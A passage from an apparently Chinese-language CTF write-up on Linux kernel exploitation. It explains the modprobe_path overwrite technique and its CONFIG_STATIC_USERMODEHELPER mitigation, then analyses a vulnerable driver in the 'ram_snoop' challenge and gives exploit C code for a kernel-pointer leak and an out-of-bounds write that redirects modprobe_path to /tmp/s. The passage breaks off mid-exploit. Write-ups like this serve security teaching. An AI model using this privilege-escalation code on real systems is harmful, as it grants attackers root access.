+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">module_name</span> <span class="o">=</span> <span class="nf">kstrdup</span><span class="p">(</span><span class="n">orig_module_name</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">module_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">free_argv</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-q&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;--&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">module_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">info</span> <span class="o">=</span> <span class="nf">call_usermodehelper_setup</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">					 <span class="nb">NULL</span><span class="p">,</span> <span class="n">free_modprobe_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">free_module_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">call_usermodehelper_exec</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">wait</span> <span class="o">|</span> <span class="n">UMH_KILLABLE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">kmod_dup_request_announce</span><span class="p">(</span><span class="n">orig_module_name</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">free_module_name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">kfree</span><span class="p">(</span><span class="n">module_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nl">free_argv</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">kfree</span><span class="p">(</span><span class="n">argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nl">out</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">kmod_dup_request_announce</span><span class="p">(</span><span class="n">orig_module_name</span><span class="p">,</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这部分代码的关键点：</p>
+<p>通过<code>call_usermodehelper_setup</code>封装好<code>execve</code>需要的所有信息，然后调用<code>call_usermodehelper_exec</code>函数以 root 权限执行<code>modprobe_path</code>的值。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-q&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;--&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">module_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">info</span> <span class="o">=</span> <span class="nf">call_usermodehelper_setup</span><span class="p">(</span><span class="n">modprobe_path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">					 <span class="nb">NULL</span><span class="p">,</span> <span class="n">free_modprobe_argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">free_module_name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ret</span> <span class="o">=</span> <span class="nf">call_usermodehelper_exec</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="n">wait</span> <span class="o">|</span> <span class="n">UMH_KILLABLE</span><span class="p">);</span>
+</span></span></code></pre></div><p>默认的<code>modprobe_path</code>值是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">modprobe_path</span><span class="p">[</span><span class="n">KMOD_PATH_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="n">CONFIG_MODPROBE_PATH</span><span class="p">;</span>
+</span></span></code></pre></div><p><code>CONFIG_MODPROBE_PATH</code>来自内核配置，默认为<code>/sbin/modprobe</code>。</p>
+<p>所以如果我们修改了<code>modprobe_path</code>的值，并执行一个非法格式文件后就会执行<code>modprobe_path</code>的值。</p>
+<h2 id="利用思路总结">利用思路总结<a hidden class="anchor" aria-hidden="true" href="#利用思路总结">#</a></h2>
+<ol>
+<li>首先通过任意地址写将<code>modprobe_path</code>的值覆盖为你的 shell 脚本；</li>
+<li>然后构造一个非法格式的文件（如<code>\xff\xff\xff\xff</code>）；</li>
+<li>执行它后内核会因为无法识别格式从而调用<code>request_module</code>函数；</li>
+<li>然后<code>request_module</code>调用<code>call_modprobe</code>函数执行<code>modprobe_path</code>的值；</li>
+<li>这时<code>modprobe_path</code>的值因为被覆盖为你的 shell 脚本，所以会以 root 权限执行它。</li>
+</ol>
+<h2 id="漏洞缓解方式">漏洞缓解方式<a hidden class="anchor" aria-hidden="true" href="#漏洞缓解方式">#</a></h2>
+<p>前面已经说过启用<code>CONFIG_STATIC_USERMODEHELPER</code>选项就会导致<code>modprobe_path</code>覆盖利用技术失效，这里结合代码分析一下原因。</p>
+<p>在<code>call_usermodehelper_setup</code>中，如果<code>CONFIG_STATIC_USERMODEHELPER</code>配置选项启用，那么就会执行以下代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_STATIC_USERMODEHELPER
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="n">sub_info</span><span class="o">-&gt;</span><span class="n">path</span> <span class="o">=</span> <span class="n">CONFIG_STATIC_USERMODEHELPER_PATH</span><span class="p">;</span>
+</span></span></code></pre></div><p>此时内核会强制使用静态、编译时写死的路径，而忽略<code>modprobe_path</code>，从而使得<code>modprobe_path</code>覆盖技术失效。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">CONFIG_STATIC_USERMODEHELPER_PATH</span><span class="o">=</span><span class="s">&#34;/sbin/usermode-helper&#34;</span>
+</span></span></code></pre></div><h2 id="例题-ram_snoop">例题 ram_snoop<a hidden class="anchor" aria-hidden="true" href="#例题-ram_snoop">#</a></h2>
+<p>下载题目：https://pan.baidu.com/s/1by2RA-cR4w6TA1SOai2tsA?pwd=cv5d</p>
+<h3 id="题目分析">题目分析<a hidden class="anchor" aria-hidden="true" href="#题目分析">#</a></h3>
+<p>题目提供了三个文件：</p>
+<ul>
+<li><code>bzImage</code>：内核镜像</li>
+<li><code>rootfs.cpio</code>：文件系统</li>
+<li><code>start.sh</code>：启动脚本</li>
+</ul>
+<p>首先分析启动脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -m 128M <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -kernel ./bzImage <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -initrd  ./rootfs.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -append <span class="s2">&#34;root=/dev/ram rdinit=/init console=ttyS0 oops=panic panic=1 quiet rodata=off&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -cpu qemu64,+smep,+smap <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">1</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -nographic
+</span></span></code></pre></div><p>保护机制：</p>
+<ul>
+<li><code>+smep</code>：禁止内核执行用户态代码；</li>
+<li><code>+smap</code>：禁止内核访问用户态数据；</li>
+<li><code>rodata=off</code>：只读数据保护关闭。</li>
+</ul>
+<p>只读数据保护关闭会导致<code>.rodata</code>段可写，这样的话即使<code>modprobe_path</code>是常量，也能被覆盖。这样就直接绕过了<code>CONFIG_STATIC_USERMODEHELPER</code>的防护。</p>
+<p>然后解压<code>rootfs.cpio</code>分析文件系统</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir rootfs
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> rootfs
+</span></span><span class="line"><span class="cl">cpio -idvm &lt; ../rootfs.cpio         
+</span></span></code></pre></div><p>在<code>init</code>启动脚本中发现内核加载了<code>babydev.ko</code>内核模块，并在后台运行<code>eatFlag</code>程序。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[*] Welcome to Kernel PWN Environment&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[*] Starting shell...&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">insmod /home/babydev.ko
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /dev/noc /tmp
+</span></span><span class="line"><span class="cl">cp /proc/kallsyms /tmp/coresysms.txt
+</span></span><span class="line"><span class="cl">/home/eatFlag <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> /bin/sh
+</span></span><span class="line"><span class="cl"><span class="c1"># exec su -s /bin/sh ctf</span>
+</span></span></code></pre></div><p>ida 逆向分析<code>eatFlag</code>程序发现它会在程序启动时读取<code>/flag</code>的内容并存放在堆内存中，然后删除该文件。所以我们只能从<code>eatflag</code>程序的堆内存中读取到 flag。</p>
+<img src="./assets/image-20260102165553583.png" alt="image-20260102165553583" style="zoom:50%;" />
+<p><code>flag</code>指针是固定地址，很明显程序是没有开启 PIE 的，所以可以从<code>flag</code>指针读取 flag 的值。</p>
+<img src="./assets/image-20260102233035737.png" alt="image-20260102233035737" style="zoom:50%;" />
+<p>接着 ida 逆向分析<code>babydev.ko</code>模块，查看函数表的函数，其中<code>__pfx_</code>开头的是内核在符号层面生成的前缀符号。</p>
+<img src="./assets/image-20260102165240888.png" alt="image-20260102165240888" style="zoom:50%;" />
+<p>接下来首先分析<code>init_module</code>函数，它是内核模块加载入口。</p>
+<ul>
+<li>分析<code>init_module</code>函数</li>
+</ul>
+<p><code>init_module</code>函数初始化了一个名为<code>noc</code>的字符设备，创建了<code>/dev/noc</code>供用户态交互，并分配了一个约 64KB 的全局内核堆缓冲区 <code>global_buf</code>。</p>
+<img src="./assets/image-20260102164620356.png" alt="image-20260102164620356" style="zoom:50%;" />
+<ul>
+<li>分析<code>dev_ioctl</code>函数</li>
+</ul>
+<p>发现内核地址泄露漏洞：</p>
+<img src="./assets/image-20260103010855493.png" alt="image-20260103010855493" style="zoom:50%;" />
+<p>由于<code>dest</code>变量在站的布局之后就是<code>v11</code>变量。所以<code>copy_to_user</code>复制 40 字节的数据到用户态会将<code>v11</code>的值也给复制到用户态。</p>
+<p>我们可以通过访问这个<code>ioctl</code>接口获取到泄露的数据。</p>
+<img src="./assets/image-20260103010932138.png" alt="image-20260103010932138" style="zoom:50%;" />
+<ul>
+<li>分析<code>dev_open</code>函数</li>
+</ul>
+<p><code>dev_open</code>在设备首次打开时分配一块内核堆内存，记录当前进程的 PID 和进程名，并将该堆指针保存到<code>file-&gt;private_data</code>，同时通过全局标志限制设备只能被单次打开。</p>
+<img src="./assets/image-20260102174239367.png" alt="image-20260102174239367" style="zoom:50%;" />
+<ul>
+<li>分析<code>dev_write</code>函数</li>
+</ul>
+<p>函数中的<code>v4</code>变量是当前文件偏移，<code>v6</code>变量是实际写入长度。</p>
+<p>当<code>v4 + a3 &gt; 0x10000</code>时，驱动试图通过<code>v6 = -*a4</code>截断写入长度，但由于<code>v6</code>为无符号整型，该赋值触发了 signed 到 unsigned 的隐式转换，导致 <code>v6</code> 变成一个极大的正数。</p>
+<p>随后该长度被直接用于<code>copy_from_user</code>，且写入地址由 <code>global_buf + data_start + f_pos</code>计算，在缺乏完整边界检查的情况下，最终形成可控偏移、可控长度的内核堆越界写漏洞。</p>
+<img src="./assets/image-20260103020917928.png" alt="image-20260103020917928" style="zoom:50%;" />
+<ul>
+<li>分析<code>dev_read</code>函数</li>
+</ul>
+<p><code>dev_read</code>根据<code>file-&gt;f_pos</code>从<code>global_buf</code>的有效数据区向用户态拷贝数据，并在读完后推进文件偏移。简单来说就是从驱动内部的缓冲区里，从当前偏移开始，复制一段数据给用户。</p>
+<img src="./assets/image-20260102174310538.png" alt="image-20260102174310538" style="zoom:50%;" />
+<ul>
+<li>分析<code>dev_seek</code>函数</li>
+</ul>
+<p>该函数实现了设备的<code>lseek</code>操作（偏移定位），根据<code>a3</code>参数的值选择模式。如果<code>a3</code>为 1 则新位置为当前文件指针加上<code>a2</code>偏移参数。如果<code>a3</code>为 2 则新位置为文件末尾加上偏移。如果<code>a3</code>参数为 3，则新位置等于偏移。</p>
+<p>通过这个函数我们可以控制文件偏移配合<code>dev_write</code>函数进行越界写利用。</p>
+<img src="./assets/image-20260102174328625.png" alt="image-20260102174328625" style="zoom: 50%;" />
+<ul>
+<li>分析<code>dev_release</code>函数</li>
+</ul>
+<p>在关闭设备文件时原子递减打开计数并释放<code>filp-&gt;private_data</code>。</p>
+<img src="./assets/image-20260102165954280.png" alt="image-20260102165954280" style="zoom:50%;" />
+<ul>
+<li>分析<code>cleanup_module</code>函数</li>
+</ul>
+<p><code>cleanup_module</code>在模块卸载时释放<code>init_module</code>中申请的内核资源。</p>
+<img src="./assets/image-20260102165819152.png" alt="image-20260102165819152" style="zoom:50%;" />
+<h3 id="利用思路">利用思路<a hidden class="anchor" aria-hidden="true" href="#利用思路">#</a></h3>
+<p><code>modprobe_path</code>覆写：</p>
+<ul>
+<li>通过<code>ioctl</code>泄露内核地址</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">proc_id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">proc_name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">mem_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">mem_used</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">mem_ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="kt">leak_data_t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 打开漏洞设备
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">dev_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/noc&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">dev_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1">// 通过ioctl泄露内核信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">leak_data_t</span> <span class="n">leak</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> 
+</span></span><span class="line"><span class="cl"><span class="nf">ioctl</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="mh">0x83170405</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">leak</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">kern_buf</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">mem_ptr</span><span class="p">;</span>
+</span></span></code></pre></div><ul>
+<li>从<code>/proc/kallsyms</code>获取<code>modprobe_path</code>地址</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_kernel_sym</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/tmp/coresysms.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span> <span class="c1">//临时文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/proc/kallsyms&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>  <span class="c1">//内核符号表路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">row</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span> <span class="n">sym_name</span><span class="p">[</span><span class="mi">256</span><span class="p">],</span> <span class="n">sym_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">sym_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nf">fgets</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">row</span><span class="p">),</span> <span class="n">fp</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 解析符号表格式：地址 类型 符号名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nf">sscanf</span><span class="p">(</span><span class="n">row</span><span class="p">,</span> <span class="s">&#34;%llx %c %255s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym_type</span><span class="p">,</span> <span class="n">sym_name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">sym_name</span><span class="p">,</span> <span class="n">name</span><span class="p">))</span> <span class="p">{</span>  <span class="c1">// 找到目标符号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">sym_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// 获取内核符号 modprobe_path 地址函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">target_sym</span> <span class="o">=</span> <span class="nf">get_kernel_sym</span><span class="p">(</span><span class="s">&#34;modprobe_path&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><ul>
+<li>计算<code>modprobe_path</code>与<code>kbase</code>的偏移</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// 分配填充数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">char</span> <span class="o">*</span><span class="n">padding</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nf">memset</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 写入大量数据填充缓冲区
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">padding</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="nf">lseek</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>  	<span class="c1">// 重置文件偏移到文件开头
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">padding</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>   <span class="c1">// 再次写入部分数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">free</span><span class="p">(</span><span class="n">padding</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">target_sym</span> <span class="o">-</span> <span class="n">kern_buf</span><span class="p">;</span>  <span class="c1">// 计算目标符号相对于内核缓冲区的偏移
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl"><span class="c1">// 拆分偏移：高56位作为基地址，低8位作为相对位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">base_addr</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffULL</span><span class="p">;</span>  <span class="c1">// 清除低8位
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">rel_pos</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">&amp;</span> <span class="mh">0xffULL</span><span class="p">;</span>     <span class="c1">// 只保留低8位
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">end_addr</span> <span class="o">=</span> <span class="n">base_addr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>       <span class="c1">// 结束地址
+</span></span></span></code></pre></div><ul>
+<li>利用任意地址写漏洞修改设备内部的<code>start/end</code>指针</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">exploit_buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>  <span class="c1">// 构建利用缓冲区
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span>   	<span class="c1">// 写入基地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">exploit_buf</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_addr</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">memcpy</span><span class="p">(</span><span class="n">exploit_buf</span> <span class="o">+</span> <span class="mi">7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">end_addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>  <span class="c1">// 写入结束地址
+</span></span></span></code></pre></div><ul>
+<li>覆写<code>modprobe_path</code>为<code>/tmp/s</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">lseek</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="mh">0x10001</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>  	 <span class="c1">// 定位到越界位置
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">write</span><span class="p">(</span><span class="n">dev_fd</span><span class="p">,</span> <span class="n">exploit_buf</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>  <span class="c1">// 写入利用数据
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">free</span><span class="p">(</span><span class="n">exploit_buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">hijack_path</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span> 
+</span></span><span class="line"><span class="cl"><span class="nf">strcpy</span><span class="p">(</span><span class="n">hijack_path</span><span class="p">,</span> <span class="s">&#34;/tmp/s&#34;</span><span class="p">);</span>  <span class="c1">// 要写入 modprobe_path 的路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> 
+</span></span><span class="line"><span class="cl"><span class="c1">// 定位到 modprobe_path 位置并写入新路径
